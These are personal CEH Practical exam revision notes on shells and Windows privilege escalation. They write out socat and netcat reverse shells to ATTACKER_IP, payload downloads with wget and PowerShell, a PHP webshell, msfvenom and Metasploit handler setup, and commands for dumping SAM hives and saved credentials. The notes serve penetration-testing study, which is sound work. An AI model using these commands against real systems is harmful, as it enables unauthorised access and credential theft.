# What the Shell — CEH Practical Revision Notes (Safe Version)

## 1. What is a Shell?

A shell provides command-line access to a system.

### Common Shells

|OS|Shells|
|---|---|
|Linux|bash, sh, zsh|
|Windows|cmd.exe, PowerShell|

---

# 2. Types of Shells

## Reverse Shell

Victim connects back to attacker.

### Flow

```text
Target ---> Attacker Listener
```

### Listener

```bash
nc -lvnp PORT
```

### Payload Example

```bash
nc ATTACKER_IP PORT
```

### Advantages

- Bypasses firewalls easily
    
- Most common in CTFs
    

### Disadvantages

- Requires attacker listener
    

---

## Bind Shell

Victim opens port; attacker connects.

### Flow

```text
Attacker ---> Target Listener
```

### Target

```bash
nc -lvnp PORT
```

### Attacker

```bash
nc TARGET_IP PORT
```

### Advantages

- No listener needed on attacker
    

### Disadvantages

- Often blocked by firewalls
    

---

# 3. Interactive vs Non-Interactive Shells

## Interactive

Supports:

- tab completion
    
- CTRL+C
    
- nano/vim
    
- ssh
    

## Non-Interactive

Cannot properly run:

- ssh
    
- sudo prompts
    
- editors
    

---

# 4. Netcat Basics

## Listener

```bash
nc -lvnp PORT
```

## Connect to Bind Shell

```bash
nc TARGET_IP PORT
```

---

# 5. Netcat Shell Stabilization

## Python PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Export TERM

```bash
export TERM=xterm
```

## Background Shell

```bash
CTRL + Z
```

## Fix Terminal

```bash
stty raw -echo; fg
```

## Reset Terminal

```bash
reset
```

---

# 6. rlwrap

## Install

```bash
sudo apt install rlwrap
```

## Stable Listener

```bash
rlwrap nc -lvnp PORT
```

### Benefits

- arrow keys
    
- history
    
- tab completion
    

---

# 7. Socat Basics

## Listener

```bash
socat TCP-L:PORT -
```

## Linux Reverse Shell

```bash
socat TCP:ATTACKER_IP:PORT EXEC:"bash -li"
```

## Windows Reverse Shell

```bash
socat TCP:ATTACKER_IP:PORT EXEC:powershell.exe,pipes
```

---

# 8. Fully Stable Socat TTY

## Listener

```bash
socat TCP-L:PORT FILE:`tty`,raw,echo=0
```

## Target

```bash
socat TCP:ATTACKER_IP:PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

---

# 9. Encrypted Socat Shells

## Generate Certificate

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
```

## Create PEM

```bash
cat shell.key shell.crt > shell.pem
```

## Encrypted Listener

```bash
socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 -
```

## Encrypted Reverse Shell

```bash
socat OPENSSL:ATTACKER_IP:PORT,verify=0 EXEC:"bash -li"
```

---

# 10. Python Web Server

## Start Web Server

```bash
sudo python3 -m http.server 80
```

---

# 11. File Transfer

## Linux

```bash
wget http://ATTACKER_IP/file
```

## Windows PowerShell

```powershell
Invoke-WebRequest -Uri http://ATTACKER_IP/file -OutFile file.exe
```

---

# 12. Named Pipe Shell

## Create Named Pipe

```bash
mkfifo /tmp/f
```

---

# 13. PowerShell Reverse Shell

## Basic Format

```powershell
powershell reverse shell one-liner
```

⚠ Avoid storing full payloads in Obsidian.

---

# 14. msfvenom Basics

## Syntax

```bash
msfvenom -p PAYLOAD FORMAT OUTPUT
```

## Windows Reverse Shell

```bash
msfvenom -p windows/x64/shell/reverse_tcp ...
```

## Linux Meterpreter

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp ...
```

---

# 15. Staged vs Stageless Payloads

## Stageless

Uses:

```text
shell_reverse_tcp
```

### Characteristics

- single payload
    
- larger size
    
- easier to catch
    

---

## Staged

Uses:

```text
shell/reverse_tcp
```

### Characteristics

- smaller initial payload
    
- requires handler
    
- stealthier
    

---

# 16. Meterpreter

## Features

- stable shell
    
- upload/download
    
- privilege escalation
    
- post exploitation
    

## Requires

- Metasploit multi/handler
    

---

# 17. Metasploit Multi/Handler

## Start

```bash
msfconsole
```

## Use Handler

```bash
use multi/handler
```

## Configure

```bash
set payload PAYLOAD
set LHOST ATTACKER_IP
set LPORT PORT
```

## Run Listener

```bash
exploit -j
```

## Show Sessions

```bash
sessions
```

## Interact

```bash
sessions ID
```

---

# 18. WebShells

## PHP Webshell

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

## Usage

```text
http://target/shell.php?cmd=whoami
```

---

# 19. Common Enumeration Commands

## Linux

```bash
whoami
id
hostname
uname -a
ip a
sudo -l
```

## Windows

```cmd
whoami
whoami /priv
ipconfig
systeminfo
net user
```

---

# 20. Windows Privilege Escalation

## Saved Credentials

```cmd
cmdkey /list
```

## Run as Saved User

```cmd
runas /savecred /user:USER cmd
```

---

# 21. PowerShell History

## View History

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

# 22. Scheduled Task Enumeration

## List Tasks

```cmd
schtasks
```

## Query Task

```cmd
schtasks /query /tn TASKNAME /fo list /v
```

---

# 23. Service Enumeration

## Query Service

```cmd
sc qc SERVICE
```

## Check Permissions

```cmd
icacls FILE
```

---

# 24. Service Misconfiguration

## Restart Service

```cmd
sc stop SERVICE
sc start SERVICE
```

---

# 25. Unquoted Service Path

## Vulnerable Example

```text
C:\Program Files\App Folder\Service.exe
```

Windows may execute:

```text
C:\Program.exe
```

---

# 26. AccessChk

## Check Service Permissions

```cmd
accesschk64.exe -qlc SERVICE
```

---

# 27. Registry Enumeration

## PuTTY Credentials

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

---

# 28. SAM and SYSTEM Hive Backup

## Export Hives

```cmd
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

---

# 29. SMB Server

## Start SMB Share

```bash
impacket-smbserver share .
```

---

# 30. SecretsDump

## Extract Hashes

```bash
secretsdump.py
```

---

# 31. Pass-the-Hash

## PsExec

```bash
psexec.py
```

---

# 32. CEH Practical Quick Checklist

## Enumeration

- users
    
- services
    
- scheduled tasks
    
- credentials
    
- registry
    
- permissions
    

## Shells

- reverse
    
- bind
    
- socat
    
- webshell
    
- meterpreter
    

## PrivEsc

- weak services
    
- writable binaries
    
- unquoted paths
    
- dangerous privileges
    
- saved credentials
    

## File Transfer

- wget
    
- curl
    
- smbserver
    
- powershell
    

---

# 33. Important CEH Practical Tips

## Always Try

- `sudo -l`
    
- `whoami /priv`
    
- `cmdkey /list`
    
- `schtasks`
    
- `sc qc`
    
- `icacls`
    
- `accesschk`
    

---

# 34. Common Ports

|Port|Service|
|---|---|
|21|FTP|
|22|SSH|
|25|SMTP|
|53|DNS|
|80|HTTP|
|443|HTTPS|
|445|SMB|
|3389|RDP|

---

# 35. Recommended Tools

|Tool|Usage|
|---|---|
|Netcat|shells|
|Socat|stable shells|
|rlwrap|shell stabilization|
|msfvenom|payload generation|
|Metasploit|handlers|
|AccessChk|permissions|
|Impacket|lateral movement|
|LinPEAS|Linux enumeration|
|WinPEAS|Windows enumeration|

---

# 36. Exam Strategy

## Workflow

1. Enumerate
    
2. Gain foothold
    
3. Stabilize shell
    
4. Enumerate internally
    
5. Escalate privileges
    
6. Maintain access
    
7. Capture flags
    
8. Document findings
    

---

# 37. Obsidian Safe Storage Tips

## Avoid Storing

- full PowerShell payloads
    
- encoded payloads
    
- meterpreter raw payloads
    

## Use Templates

```bash
msfvenom -p PAYLOAD ...
```

instead of full exploit strings.

---

# 38. Important Reminder

A shell is only the beginning.

Always convert unstable access into:

- SSH
    
- RDP
    
- WinRM
    
- Meterpreter
    
- stable TTY shell
    

for easier post-exploitation and privilege escalation.